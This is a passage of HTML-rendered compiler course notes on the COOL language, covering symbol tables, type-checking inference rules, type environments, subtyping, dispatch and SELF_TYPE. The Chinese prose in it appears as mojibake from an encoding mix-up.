class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> x: Int &lt;- <span class="hljs-number">0</span> <span class="hljs-function"><span class="hljs-keyword">in</span> e</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">let</span> <span class="hljs-title">x</span>(<span class="hljs-params">sym</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">init</span></span> = <span class="hljs-number">0.</span>(sym)     e(sym + x)<br><br>x <span class="hljs-keyword">is</span> defined <span class="hljs-keyword">in</span> subtree e<br></code></pre></td></tr></table></figure><p><code>Recall: let x: Int &lt;- 0 in e</code></p><p>Idea:</p><ul><li>Before processing e, add definition of x to current definitions,overriding any other definition of x</li><li>Recurse</li><li>After processing e, remove definition of x and restore olddefinition of x</li></ul><p>a symbol table is a data structure that tracks the current bindingsof identifiers</p><p>ç®€å•çš„å®ç°å¯ä»¥ä½¿ç”¨stack</p><ul><li><code>Add_symbol(x)</code></li><li><code>Find_symbol(x) search stack, starting from top fro x, return x or NULL if none found</code></li><li><code>Remove() pop from ths stack</code></li><li><code>exit_scope() exit current scope</code></li><li><code>Check_scope(x) true if x defined in current scope</code></li></ul><p>åœ¨COOLé‡Œä½¿ç”¨stackå³å¯å¯¹letå£°æ˜çš„å˜é‡è¿›è¡Œå¤„ç†</p><p>æ¯æ¬¡ç”¨letå£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå³pushå…¥stackï¼Œè€Œä¸”ä¹Ÿå…è®¸åµŒå¥—ï¼Œæ¯æ¬¡é€€å‡ºå½“å‰letèŒƒå›´ï¼Œå³popå‡ºå˜é‡ï¼›</p><p>ä½†æ˜¯å¯¹äºå‡½æ•°ç¡®ä¸å¥½ä½¿ç”¨ï¼Œæ¯”å¦‚å‡½æ•°å‚æ•°ï¼Œä¸€æ¬¡æœ‰å¤šä¸ªå‚æ•°ï¼Œå¹¶ä¸”æœ‰é‡åçš„å‚æ•°ï¼Œæ‰€ä»¥å¾—ä¸€æ¬¡pushå¤šä¸ªå˜é‡ï¼Œä½†æ˜¯å¤šä¸ªå˜é‡æ˜¯åœ¨åŒä¸€ä¸ªå±‚çº§é‡Œï¼Œè€Œstackçš„è§£å†³æ–¹æ¡ˆé»˜è®¤ä¸€ä¸ªå˜é‡ä¸€ä¸ªå±‚çº§</p><blockquote><p>class names can be used before being defined in COOL</p><p>solutionï¼štwo passes to tranversal on AST</p><ul><li>Pass1: Gather all class names</li><li>Pass2: Do the checking</li></ul></blockquote><h2 id="ç±»å‹">ç±»å‹</h2><p>ä»€ä¹ˆæ˜¯ç±»å‹ï¼Œä¸åŒçš„è¯­è¨€å¯¹äºç±»å‹å®šä¹‰ä¸åŒï¼Œä½†é€šå¸¸æ„ä¹‰ä¸Šï¼Œä¸€è‡´è®¤ä¸ºè¢«å®šä¹‰å¦‚ä¸‹ï¼š</p><ul><li>ä¸€äº›å€¼çš„é›†åˆï¼ˆæ•°æ®ï¼‰</li><li>å¯æ“ä½œè¿™äº›å€¼çš„ä¸€äº›æ“ä½œï¼ˆç®—æ³•/å‡½æ•°/æ–¹æ³•ï¼‰</li></ul><p>å¿…é¡»ç¡®ä¿åœ¨è½¬åŒ–ä¸ºæœºå™¨è¯­è¨€ä¹‹å‰åšå¥½ç±»å‹æ£€æŸ¥å“¦ï¼Œå› ä¸ºæœºå™¨è¯­è¨€æ‰§è¡ŒæŒ‡ä»¤ä¸ä¼šåšä»»ä½•æ£€æŸ¥ã€‚è¯­è¨€ç±»å‹ç³»ç»ŸçŸ¥åé‡Œåœ¨å“ªäº›ç±»å‹ä¸Šçš„å“ªäº›æ“ä½œæ˜¯åˆæ³•çš„ã€‚è¯­è¨€çš„ç±»å‹æ£€æŸ¥ç›®çš„å°±æ˜¯ç¡®ä¿åœ¨æ­£ç¡®çš„ç±»å‹ä¸Šæ‰§è¡Œæ­£ç¡®çš„æ“ä½œã€‚</p><p>ç±»å‹æ£€æŸ¥æ—¶æœŸï¼š</p><ul><li>ç¼–è¯‘æ—¶æœŸæ‰§è¡Œç±»å‹æ£€æŸ¥ï¼šC, COOL, Java</li><li>è¿è¡Œæ—¶ç±»å‹æ£€æŸ¥ï¼šç¨‹åºæ‰§è¡Œçš„æ—¶å€™æ‰§è¡Œç±»å‹æ£€æŸ¥, Python, Lisp, Perl</li><li>æ— ç±»å‹æ£€æŸ¥ï¼šmachine code</li></ul><p>é™æ€ç±»å‹æ£€æŸ¥ vs åŠ¨æ€ç±»å‹æ£€æŸ¥</p><ul><li>é™æ€æ£€æŸ¥å¯ä»¥åœ¨ç¼–è¯‘æ—¶æœŸæ•è·é”™è¯¯</li><li>é¿å…è¿è¡Œæ—¶é”™è¯¯</li></ul><p>åŠ¨æ€æ£€æŸ¥ï¼š</p><ul><li>é™æ€ç±»å‹æ£€æŸ¥æ˜¯æœ‰å±€é™æ€§çš„ï¼Œæœ‰äº›è¯­å¥åœ¨é™æ€ç±»å‹ä¸å¥½æ£€æŸ¥å‡ºæ¥ï¼Œæ¯”å¦‚ç»§æ‰¿çš„æ—¶å€™ï¼Œå­ç±»è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•</li></ul><p>ç°ä»£ç¼–ç¨‹è¯­è¨€å¾ˆå¤šç»“åˆäº†ä¸¤è€…ï¼Œå¦‚ï¼š</p><p>Cï¼Œjavaå¯ä»¥ä½¿ç”¨unsafeé€ƒè„±é™æ€æ£€æŸ¥</p><p>People retrofit static typing to dynamically typed languages fordebugging or optimization</p><p>ç±»å‹æ£€æŸ¥ï¼šéªŒè¯ç±»å‹çš„åˆæ³•æ€§</p><p>ç±»å‹æ¨æ–­ï¼šè‡ªåŠ¨æ¨æ–­å’Œå¡«å……ç¼ºå¤±çš„ç±»å‹ä¿¡æ¯</p><p>ä¹‹å‰å·²ç»è§è¿‡ä¸€äº›formal notionsï¼Œæ¯”å¦‚ï¼š</p><ul><li>Regular expressions</li><li>Context-free grammars</li></ul><p>ç±»å‹æ£€æŸ¥ä¹Ÿæœ‰ä¸€å¥—æ ‡å‡†çš„é€»è¾‘æ¨å¯¼è§„åˆ™ï¼š</p><p>æ¨å¯¼è§„åˆ™å…·æœ‰å¦‚ä¸‹å½¢å¼ï¼š</p><p><em>If Hypothesis is true, then Conclusion is true</em></p><p>ç±»å‹æ£€æŸ¥å°±æ˜¯é€šè¿‡è¿™æ ·çš„æ¨ç†ï¼š</p><p><em>If E1 and E2 have certain types, then E3 has a certaintype</em></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">^ =&gt; <span class="hljs-built_in">and</span><br>=&gt; <span class="hljs-built_in">if</span>-then<br><span class="hljs-symbol">x:</span> <span class="hljs-built_in">T</span> =&gt; x has <span class="hljs-built_in">type</span> &#x27;<span class="hljs-built_in">T</span>&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>if e1 has type int and e2 type int, then e1 + e2 has type int=======&gt;</p><p>e1 has type ^ e2 has type int =&gt; e1 + e2 has type int=======&gt;</p><p>(E1: int ^ e2 : int) =&gt; e1 + e2: int</p></blockquote><p>the statement <code>(E1: int ^ e2 : int) =&gt; e1 + e2: int</code> isa special case of<code>hypothesis1 ^ ... ^ hypothesisn =&gt; Conclusion</code></p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„æ¨å¯¼è§„åˆ™å†™å‡ºå¦‚ä¸‹ç¬¦å·å½¢å¼ï¼š <spanclass="math display">\[\frac{\vdash hypothesis1 \vdash hypothesis2 ... \vdashhypothesisn}{\vdash Conslusion}\]</span> <span class="math inline">\(\vdash\)</span> means ''it isprovable that ..."</p><p>çœ‹å‡ ä¸ªç®€å•çš„æ¨å¯¼è§„åˆ™ï¼š <span class="math display">\[\frac{i \quad is \quad an \quad interger \quad literal}{\vdash i: int}\]</span></p><p><span class="math display">\[\frac{e1: int \quad e2: int}{\vdash e1 + e2: int}\]</span></p><p>ç±»å‹æ£€æŸ¥å¯ä»¥å¾ˆå¥½çš„åŸºäºASTæ¥åšï¼š</p><p>å¦‚æœå·²ç»è¯æ˜äº†å­è¡¨è¾¾å¼çš„ç±»å‹ï¼Œé‚£ä¹ˆçˆ¶èŠ‚ç‚¹çš„ç±»å‹ä¹Ÿå°±å¾ˆå¥½åœ°å¾—åˆ°ï¼Œæ‰€ä»¥ç±»å‹æ£€æŸ¥å’Œæ¨æ–­æ˜¯è‡ªåº•å‘ä¸Šåšçš„</p><h2 id="ç±»å‹ç¯å¢ƒ">ç±»å‹ç¯å¢ƒ</h2><p>åœ¨ç±»å‹æ¨å¯¼/æ£€æŸ¥ä¸­ï¼Œæœ‰çš„æ—¶å€™ä¸€ä¸ªå˜é‡çš„ç±»å‹ä¿¡æ¯éœ€è¦æ›´å¤šçš„ä¿¡æ¯æ‰èƒ½è·å¾—è¯¥å˜é‡çš„ç±»å‹ï¼Œæ‰€ä»¥åœ¨æˆ‘ä»¬çš„æ¨å¯¼è§„åˆ™é‡Œéœ€è¦åŠ å…¥æ›´å¤šçš„ç±»å‹ä¿¡æ¯â€”â€”ç±»å‹ç¯å¢ƒï¼Œç±»å‹ç¯å¢ƒç»™äºˆäº†è‡ªç”±å˜é‡æ›´å¤šçš„ç›¸å…³ç±»å‹ä¿¡æ¯</p><p>ç±»å‹ç¯å¢ƒï¼ša fucntion from object identifiers to Types(å³æ ‡è¯†ç¬¦åˆ°ç±»å‹çš„æ˜ å°„)</p><p>è‡ªç”±å˜é‡ï¼šå¦‚æœä¸€ä¸ªè¡¨è¾¾å¼é‡Œå­˜åœ¨ä¸€ä¸ªå˜é‡æ²¡æœ‰è¢«å®šä¹‰ï¼Œé‚£ä¹ˆè¯¥å˜é‡å°±æ˜¯è‡ªç”±å˜é‡</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> y: <span class="hljs-built_in">int</span> &lt;- <span class="hljs-number">0</span> <span class="hljs-keyword">in</span> x + y<br>è¿™é‡Œ<span class="hljs-keyword">let</span>é™å®šä¸‹ï¼Œxæ˜¯æœªå®šä¹‰çš„ï¼Œè€Œyæ˜¯<span class="hljs-built_in">int</span>ç±»å‹ä¸”åˆå§‹åŒ–ä¸º<span class="hljs-number">0</span>ï¼Œåœ¨è¿›è¡Œç±»å‹æ£€æŸ¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬åªæœ‰æ‹¥æœ‰äº†å‰é¢å…³äºxçš„ä¿¡æ¯ï¼Œæ‰èƒ½çŸ¥é“xçš„ç±»å‹<br></code></pre></td></tr></table></figure><p>let O be function from Object idenfiers to types, notion as follow:<span class="math display">\[O\vdash e: T\]</span> è¯»ä½œï¼šåœ¨ç¯å¢ƒOä¸‹ï¼Œå¯ä»¥è¯æ˜eæ˜¯Tç±»å‹</p><p>å•ç‚¹ä¿®æ”¹ï¼š <span class="math display">\[\begin{equation}\begin{aligned}\frac{O[T/x]\vdash e_1:int  \quad}{O\vdash e_1 + e_2:Int }\end{aligned}\end{equation}\]</span></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">è¡¨ç¤º<br>O[T/<span class="hljs-keyword">x</span>](<span class="hljs-keyword">x</span>) <span class="hljs-operator">=</span> int<br>O[T/<span class="hljs-keyword">x</span>](y) <span class="hljs-operator">=</span> y (<span class="hljs-keyword">x</span> !<span class="hljs-operator">=</span> y)<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šç±»å‹ç¯å¢ƒOå¯ä»¥ç”±ä¹‹å‰çš„Symbol tableå®ç°ï¼Œå› ä¸º</p><ul><li>ç±»å‹ç¯å¢ƒç»™äºˆå½“å‰ä½œç”¨åŸŸå†…éƒ¨æ ‡è¯†ç¬¦ç±»å‹ï¼ˆå’Œä½œç”¨åŸŸç±»å‹ï¼Œåªä¸è¿‡ä½œç”¨åŸŸæ˜¯è®°å½•æ ‡è¯†ç¬¦ï¼‰</li><li>ç±»å‹ç¯å¢ƒä¹Ÿæ˜¯è‡ªä¸Šå‘ä¸‹ä¸æ–­æ‰©å¢å’Œå•ç‚¹ä¿®æ”¹</li><li>ä½†æ˜¯ç±»å‹æ£€æŸ¥å’Œæ¨æ–­æ˜¯è‡ªåº•å‘ä¸Šçš„</li></ul><h2 id="subtypings">Subtypings</h2><p>subtypings ä¸»è¦ç”¨äºç»§æ‰¿ç±»å‹1åˆ¤æ–­ <span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO[T_0/x]\vdash e_1:T_1  \quad}{O\vdash let \quad x: T_0 = e_0 \quad in \quad e_1: T_1 }\end{aligned}\end{equation}\]</span> åœ¨ç±»ä¸Šå®šä¹‰å…³ç³»ï¼š&lt;=</p><ul><li>X &lt;= Y</li><li>X &lt;= Y if X inherits from Y</li><li>X &lt;= Z if X &lt;= Y and Y &lt;= Z</li></ul><p><span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO[T_0/x]\vdash e_1:T_1  \quadT_0 &lt;= T}{O\vdash let \quad x: T_0 = e_0 \quad in \quad e_1: T_1 }\end{aligned}\end{equation}\]</span></p><p>å±æ€§åˆå§‹åŒ–ï¼š <span class="math display">\[\begin{equation}\begin{aligned}\frac{O_c(x) = T_0  \quadO_C\vdash e_1:T_1  \quadT_1 &lt;= T0}{O\vdash x: T_0 = e_1 }\end{aligned}\end{equation}\]</span></p><p>è€ƒè™‘ <code>if e0 then e1 else e2 fi</code></p><p>è¡¨è¾¾å¼çš„ç»“æœè¦ä¹ˆe1è¦ä¹ˆe2ï¼Œå¯¹åº”çš„ç±»å‹è¦ä¹ˆæ˜¯e1çš„ç±»å‹è¦ä¹ˆæ˜¯e2çš„ç±»å‹</p><p>é‚£ä¹ˆæ•´ä¸ªif-elseè¡¨è¾¾å¼è¿”å›ä»€ä¹ˆç±»å‹ï¼Ÿ</p><p>æœ€å¥½çš„æ–¹æ³•æ˜¯è¿”å›e1å’Œe2çš„æœ€å°ä¸Šç•Œç±»å‹ï¼ˆleast upper typeï¼‰</p><p>least upper bound: lub(X, Y)ï¼Œè¡¨ç¤ºXå’ŒYçš„æœ€å°ä¸Šç•Œç±»å‹ï¼Œ</p><p>if X &lt;= Z ^ Y &lt;= Z: Z is an upper bound</p><p>If X &lt;= Z' ^ Y &lt;= Z', Z &lt;= Z': Z is an upper bound</p><p>COOLé‡Œï¼Œä¸¤ä¸ªç±»å‹çš„æœ€å°ä¸Šç•Œæ˜¯å®ƒä»¬ç»§æ‰¿æ ‘é‡Œæœ€è¿‘å…¬å…±ç¥–å…ˆ</p><p><span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:Bool  \quadO\vdash e_1:T_1  \quadO\vdash e_1:T_2  \quad}{O\vdash if \quad e_0 \quad then \quad e_1 \quad else \quad e_2 \quadfi \quad fi: lub(T_1, T_2) }\end{aligned}\end{equation}\]</span></p><h2 id="typing-methods">Typing Methods</h2><p><span class="math display">\[dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quad}{O\vdash e_0.f(e_1, ... e_n): ? }\end{aligned}\end{equation}\]</span></p><p>ä¸çŸ¥é“ä»»ä½•å…³äºfçš„ä¿¡æ¯ï¼Œå¦‚ä½•çŸ¥é“fçš„è¿”å›å€¼ç±»å‹ï¼Ÿ</p><p>In cool, method and object identifiers live in different namespaces</p><ul><li>A method foo and an object foo can coexisted in the same scope</li></ul><p>In the type rules, this is reflected by a seperate mapping M formethod signatures <span class="math display">\[M(C, f) = (T_1, ... T_n, T_{n+1}) means \quad in \quad Class \quad C\quad there \quad is \quad \\ a \quad method \\ f: \quadf(x_1: T_1, ... x_n: T_n): T_{n+1}\]</span></p><p>dispatch <span class="math display">\[dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quadT_i &lt;= T_{i&#39;} 1 &lt;= i &lt;= n \quadM(T_0, f) = (T_{1&#39;}, ... T_{n&#39;}, T_{n+1})}{O\vdash e_0.f(e_1, ... e_n): T_{n+1} }\end{aligned}\end{equation}\]</span></p><p>é™æ€dispatch <span class="math display">\[static dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quadT_0 &lt;= T \quadT_i &lt;= T_{i&#39;} 1 &lt;= i &lt;= n \quadM(T_0, f) = (T_{1&#39;}, ... T_{n&#39;}, T_{n+1})}{O\vdash e_0@T.f(e_1, ... e_n): T_{n+1} }\end{aligned}\end{equation}\]</span> æœ€ç»ˆç»“åˆæ–¹æ³•ç¯å¢ƒï¼Œå˜é‡ç¯å¢ƒå’Œç±»ï¼Œ <span class="math display">\[\begin{equation}\begin{aligned}\frac{O, M, C\vdash e_1:int  \quadO, M, C\vdash e_2:int  \quad}{O, M, C\vdash e1 + e2: int }\end{aligned}\end{equation}\]</span> ä¸Šé¢çš„è§„åˆ™ä»…é€‚ç”¨äºCOOL</p><blockquote><p>General themes:</p><ul><li>Type rules are defined on the structure of expressions</li><li>Types of varaibles are modeled by an environment</li></ul></blockquote><h2 id="static-type-vs-dynamic-type">Static Type vs Dynamic Type</h2><p>é™æ€ç±»å‹æ£€æŸ¥ï¼š</p><p>å¯ä»¥åœ¨ç¼–è¯‘æ—¶æœŸå‘ç°ä¸€äº›å¸¸è§çš„é”™è¯¯ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›ä¸æ˜¯é”™è¯¯çš„ä»£ç è¢«è¯†åˆ«å‡ºæ¥ï¼ŒæŠ¥å‘Šé”™è¯¯ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦åŠ¨æ€ç±»å‹æ£€æŸ¥ï¼Œä½†æ˜¯å®é™…ä¸Šä¸ºäº†è®©æœ‰äº›ä¸æ˜¯é”™è¯¯çš„ä»£ç èƒ½å¤Ÿé€šè¿‡é™æ€ç±»å‹æ£€æŸ¥ï¼Œéœ€è¦ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ï¼š</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-title">interits</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>x: <span class="hljs-type">A </span>&lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span>; <span class="hljs-comment">// é™æ€æ£€æŸ¥å¯ä»¥é€šè¿‡ï¼Œå·¦å³ç±»å‹ä¸€è‡´</span><br>...<br>x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">V</span>; <span class="hljs-comment">// é™æ€æ£€æŸ¥é€šä¸è¿‡ï¼Œå·¦å³ç±»å‹ä¸ä¸€è‡´</span><br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>ç†æƒ³æƒ…å†µä¸‹ï¼Œå¯¹äºæ‰€æœ‰çš„è¡¨è¾¾å¼ï¼šdynamic_type(E) &lt;=static_type(E)</p><p>å¯¹äºä»»æ„è¡¨è¾¾å¼Eï¼Œdynamic_type(E) &lt;=static_type(E)ï¼Œè¡¨ç¤ºè¡¨è¾¾å¼Eçš„é™æ€ç±»å‹æ£€æŸ¥å¾—åˆ°çš„ç±»å‹æ˜¯å¯¹åº”è¡¨è¾¾å¼åŠ¨æ€æ£€æŸ¥å¾—åˆ°å¾—ç±»å‹çš„çˆ¶ç±»</p><p>All operations that can be used on an object if type C can also beused on an object of type C' &lt;= C</p><ul><li><p>Such as fetching the value of attribute</p></li><li><p>Or invoking a method on the object</p></li><li><p>Subclass only add attributes or methods</p></li><li><p>```</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>  <br><br><br><br>## Self Type<br><br>è€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š<br><br>```java<br><span class="hljs-keyword">class</span> Count &#123;<br>    i : int &lt;- <span class="hljs-number">0</span>;<br>    inc () : Count &#123;<br>        &#123;<br>            i &lt;- i + <span class="hljs-number">1</span>;<br>            self;<br>        &#125;<br>    &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>ç±»CountåŒ…å«ä¸€ä¸ªè®¡æ•°å™¨ã€‚</p></li><li><p>incæ–¹æ³•é€‚ç”¨äºä»»ä½•å­ç±»ã€‚</p></li><li><p>è€ƒè™‘Countçš„å­ç±»Stock</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stock</span> inherits Count &#123; <br>name : String; -- name of item<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    Stock a &lt;- (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Stock</span>).inc();<br>    ... a.name ...<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ç”¨æ³•åœ¨å·²æœ‰çš„ç±»å‹ç³»ç»Ÿä¼šæŠ¥é”™ï¼Œå› ä¸ºincè¿”å›çš„ç±»å‹æ˜¯Countï¼Œä½†ä½†æ˜¯èµ‹å€¼çš„å¯¹è±¡æ˜¯Stockå¯¹è±¡</p><ul><li><p>(new Stock).inc()å…·æœ‰åŠ¨æ€ç±»å‹Stockï¼›</p></li><li><p>å› æ­¤å¦‚ä¸‹è¯­å¥æ˜¯åˆæ³•çš„;</p><p>Stock a &lt;- (new Stock).inc()ï¼›</p></li><li><p>ä½†è¿™ä¸æ˜¯å¾ˆå¥½çš„ç±»å‹ç³»ç»Ÿï¼Œå› ä¸º(newStock).inc()çš„é™æ€ç±»å‹ä¸ºCountï¼›</p></li><li><p>ç±»å‹æ£€æŸ¥å™¨â€œä¸¢å¤±â€ç±»å‹ä¿¡æ¯</p><ul><li>è¿™ä½¿å¾—ç»§æ‰¿incæ¯«æ— ç”¨å¤„ ï¼›</li><li>å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºæ¯ä¸ªå­ç±»é‡æ–°å®šä¹‰incï¼Œå¹¶ä½¿ç”¨ä¸“é—¨çš„è¿”å›ç±»å‹ ã€‚</li></ul></li></ul><p>è§£å†³ä¸Šè¿°é—®é¢˜éœ€è¦å¼•å…¥SELF_TYPE</p><p>æˆ‘ä»¬å°†ä½¿ç”¨self typeæ‰©å±•ç±»å‹ç³»ç»Ÿï¼š</p><ul><li>incè¿”å›selfï¼›</li><li>å› æ­¤ï¼Œè¿”å›å€¼ä¸â€œselfâ€å…·æœ‰ç›¸åŒçš„ç±»å‹ï¼›</li><li>å¯ä»¥æ˜¯Countæˆ–Countçš„ä»»ä½•å­ç±»å‹ï¼</li></ul><p>å¼•å…¥å…³é”®å­—SELF_TYPEä»¥ç”¨äºæ­¤ç±»å‡½æ•°çš„è¿”å›å€¼ï¼ŒSELF_TYPEå…è®¸åœ¨ç»§æ‰¿incæ—¶æ›´æ”¹incçš„è¿”å›ç±»å‹</p><p>ä¿®æ”¹incçš„å£°æ˜ï¼š</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nim">inc(): <span class="hljs-type">SELF_TYPE</span> <span class="hljs-meta">&#123;...&#125;</span><br></code></pre></td></tr></table></figure><p>ç±»å‹æ£€æŸ¥ç³»ç»Ÿç°åœ¨å¯ä»¥è¯æ˜ï¼š</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">O</span><span class="hljs-operator">,</span> <span class="hljs-variable">M</span><span class="hljs-operator">,</span> <span class="hljs-built_in">C</span> <span class="hljs-operator">|-</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">new</span> <span class="hljs-built_in">Count</span><span class="hljs-punctuation">)</span><span class="hljs-operator">.</span><span class="hljs-variable">inc</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-operator">:</span> <span class="hljs-built_in">Count</span><br><span class="hljs-built_in">O</span><span class="hljs-operator">,</span> <span class="hljs-variable">M</span><span class="hljs-operator">,</span> <span class="hljs-built_in">C</span> <span class="hljs-operator">|-</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">new</span> <span class="hljs-variable">Stock</span><span class="hljs-punctuation">)</span><span class="hljs-operator">.</span><span class="hljs-variable">inc</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-operator">:</span> <span class="hljs-variable">Stock</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„SELF_TYPEä¸æ˜¯åŠ¨æ€ç±»å‹</p><ul><li>å®ƒä¹Ÿä¸æ˜¯ç±»åï¼›</li><li>å®ƒæ˜¯é™æ€ç±»å‹ï¼›</li><li>å¸®åŠ©ç±»å‹æ£€æŸ¥å™¨æ›´å¥½åœ°è·Ÿè¸ªç±»å‹ï¼›</li><li>ä½¿ç±»å‹æ£€æŸ¥å™¨æ¥å—æ›´æ­£ç¡®çš„ç¨‹åº</li></ul><p>ç®€è€Œè¨€ä¹‹ï¼Œæ‹¥æœ‰SELF_TYPEå¯ä»¥æé«˜ç±»å‹ç³»ç»Ÿçš„è¡¨è¾¾èƒ½åŠ›ã€‚</p><p>What can be the dynamic type of the object returned by inc?ï¼ˆincå°†è¿”å›ä»€ä¹ˆæ ·çš„åŠ¨æ€ç±»å‹ï¼‰</p><ul><li>Answer: whatever could be the Count or any subclass of Count of'self'</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">A</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-symbol">B</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-symbol">C</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br></code></pre></td></tr></table></figure><p>In genreral, if SELF_TYPE appears textually in the class C as thedeclared type of E then</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">dynamic_type</span><span class="hljs-params">(E)</span></span> &lt;= C<br></code></pre></td></tr></table></figure><blockquote><p>Note: The meaning of SELF_TYPE depends on where it appears , <spanclass="math inline">\(SELF\_TYPE_c\)</span> refers to an occurence ofSELF_TYPE in the body of C</p></blockquote><p><span class="math display">\[SELF\_TYPE_c &lt;= C\]</span></p><p>In type checking it is always safe to replace <spanclass="math inline">\(SELF\_TYPE_c\)</span> by C <spanclass="math display">\[SELF\_TYPE_c &lt;= SELF\_TYPE_c\]</span> in cool, we never compare SELF_TYPEs coming from differentclasses <span class="math display">\[SELF\_TYPE_c &lt;= T \quad if \quad C &lt;= T\]</span></p><ul><li><span class="math inline">\(SELF\_TYPE_c\)</span> can be any subtypeof c</li><li>This includes C itself</li><li>Thus this is the moe flexible rule we can allow</li></ul><p>let T and T' be any types but SELF_TYPE</p><ol type="1"><li><span class="math inline">\(lub(SELF\_TYPE_c, SELF\_TYPE_c) =SELF\_TYPE_c\)</span></li><li><span class="math inline">\(lub(SELF\_TYPE_c, T) = lub(C,T)\)</span></li><li><span class="math inline">\(lub(T, SELF\_TYPE_c) = lub(C,T)\)</span></li><li><span class="math inline">\(lub(T, T&#39;) defined asbefore\)</span></li></ol><p><strong>å“ªé‡Œä½¿ç”¨SELF_TYPE</strong></p><p><strong>self type checking</strong></p><h2 id="é”™è¯¯æ¢å¤">é”™è¯¯æ¢å¤</h2><p>ä¸è§£æä¸€æ ·ï¼Œä»ç±»å‹é”™è¯¯ä¸­æ¢å¤ä¹Ÿå¾ˆé‡è¦</p><p>ç›®æ ‡ï¼š</p><ul><li>What type is assigned to an expresson with no legitimate type ?</li><li>This type will influence the typing of the enclosing expression</li></ul><p><strong>æ–¹æ³•1ï¼š</strong></p><p>assign type Object to ill-typed 